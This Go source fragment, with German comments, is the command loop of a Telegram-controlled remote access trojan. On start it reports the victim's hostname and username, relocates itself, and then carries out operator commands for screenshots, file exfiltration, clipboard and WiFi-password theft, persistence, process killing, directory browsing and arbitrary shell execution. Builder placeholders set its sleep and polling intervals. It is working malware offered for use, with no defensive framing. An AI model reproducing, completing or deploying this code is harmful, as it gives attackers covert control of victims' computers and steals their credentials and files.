// ── Polling ────────────────────────────────────────────────────────────────────

type tgMsg struct {
	ID int    `json:"update_id"`
	M  *inner `json:"message"`
}
type inner struct{ Text string `json:"text"` }
type tgResp struct {
	OK     bool     `json:"ok"`
	Result []tgMsg `json:"result"`
}

func poll(offset int) ([]tgMsg, int) {
	data, err := post("getUpdates", map[string]interface{}{
		"offset": offset, "timeout": 30, "limit": 10,
	})
	if err != nil {
		return nil, offset
	}
	var r tgResp
	if json.Unmarshal(data, &r) != nil || !r.OK {
		return nil, offset
	}
	next := offset
	for _, u := range r.Result {
		if u.ID+1 > next {
			next = u.ID + 1
		}
	}
	return r.Result, next
}

// ── Main ───────────────────────────────────────────────────────────────────────

func main() {
	time.Sleep(TMPL_SLEEP * time.Second)

	host, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	send(fmt.Sprintf(
		"🟢 <b>Agent online</b>\n<code>%s\\%s</code>\n\n<b>!help</b> für alle Befehle.",
		host, user,
	))

	relocated := false
	offset := 0
	for {
		updates, next := poll(offset)
		offset = next

		// Erst nach erstem erfolgreichem Poll relocaten — nicht beim Start
		if !relocated {
			relocate()
			relocated = true
		}

		for _, upd := range updates {
			if upd.M == nil {
				continue
			}
			txt := strings.TrimSpace(upd.M.Text)
			if txt == "" {
				continue
			}

			_, arg, _ := strings.Cut(strings.TrimPrefix(txt, "!"), " ")

			switch {
			case txt == "!help" || txt == "help":
				send(cmdHelp())
			case txt == "!sysinfo" || txt == "sysinfo":
				send(cmdSysinfo())
			case txt == "!screenshot":
				send("📸 Erstelle Screenshot...")
				cmdScreenshot()
			case strings.HasPrefix(txt, "!download "):
				cmdDownload(strings.TrimPrefix(txt, "!download "))
			case txt == "!clipboard":
				send(cmdClipboard())
			case txt == "!wifi":
				send("🔍 Suche WLAN-Passwörter...")
				send(cmdWifi())
			case txt == "!persist":
				send(cmdPersist())
			case txt == "!ps":
				send(cmdPs())
			case strings.HasPrefix(txt, "!kill "):
				send(cmdKill(arg))
			case strings.HasPrefix(txt, "!ls"):
				send(cmdLs(arg))
			case strings.HasPrefix(txt, "!cd "):
				send(cmdCd(arg))
			case txt == "!exit":
				send("🔴 Agent beendet.")
				os.Exit(0)
			case strings.HasPrefix(txt, "!"):
				out := shell(strings.TrimPrefix(txt, "!"))
				send("<code>" + esc(out) + "</code>")
			}
		}

		if len(updates) == 0 {
			time.Sleep(TMPL_INTERVAL * time.Second)
		}
	}
}
